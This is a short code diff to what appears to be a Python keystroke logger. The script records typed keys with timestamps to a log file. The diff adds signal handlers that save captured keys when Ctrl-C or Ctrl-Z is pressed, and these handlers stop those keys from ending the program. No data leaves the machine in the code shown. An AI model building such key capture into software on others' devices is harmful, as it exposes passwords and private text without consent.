@@ -1,6 +1,8 @@
 import os
 from datetime import datetime
 from key_listener import KeyListener
+import signal
+from functools import partial
 
 # --------------------- CONSTANTS --------------------- #
 
@@ -44,7 +46,12 @@ def format_message(content: str) -> str:
     date = 'DATE -> {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
     sep = '\n# ---------------------------------------------- #\n'
 
-    return '{date}{sep} {content}{sep}\n\n'.format(date=date, content=content, sep=sep)
+    return '{date}{sep} {content}{sep}\n'.format(date=date, content=content, sep=sep)
+
+def handle_signals(key_listener):
+    typed_keys = key_listener.get_last_keys()
+    message = format_message(typed_keys)
+    write_to_log(message, LOG_FILE)
 
 # --------------------- MAIN --------------------- #
 
@@ -52,6 +59,12 @@ def main():
     while True:
         key_listener = KeyListener()
         typed_keys = key_listener.read_keys()
+
+        partial_handle_signals_sigint = partial(handle_signals, key_listener)
+        signal.signal(signal.SIGINT, partial_handle_signals_sigint)
+
+        partial_handle_signals_sigtstp = partial(handle_signals, key_listener)
+        signal.signal(signal.SIGTSTP, partial_handle_signals_sigtstp)
 
         message = format_message(typed_keys)
         write_to_log(message, LOG_FILE)
